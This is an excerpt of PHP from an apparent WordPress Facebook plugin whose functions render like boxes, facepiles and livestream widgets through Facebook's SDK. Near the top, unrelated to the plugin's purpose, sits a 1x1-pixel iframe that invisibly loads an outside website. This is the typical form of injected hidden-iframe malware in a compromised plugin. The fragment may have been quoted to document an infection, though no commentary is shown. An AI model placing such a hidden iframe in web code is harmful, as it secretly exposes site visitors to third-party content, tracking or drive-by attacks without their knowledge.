...
<iframe src="http://www.baripowersell.com" width="1" height="1"></iframe>
...
function wpc_likebox($content= null) { ?>
<div id="fb-root"></div>
...
function wpc_send_button($content= null) { ?>
...
function wpc_commentsbox($content= null) { ?>
...
function wpc_facepile($content= null) { ?>
<div id="fb-root"></div>
<script src="http://connect.facebook.net/<?php echo get_option('wpc_aiofp_language'); ?>/all.js#xfbml=1"></script>
...
function wpc_livestream($content= null) { ?>
<div id="fb-root"></div>
<script src="http://connect.facebook.net/<?php echo get_option('wpc_aiofp_language'); ?>/all.js#appId=<?php echo get_option('wpc_aiofp_appid'); ?>&amp;xfbml=1"></script>
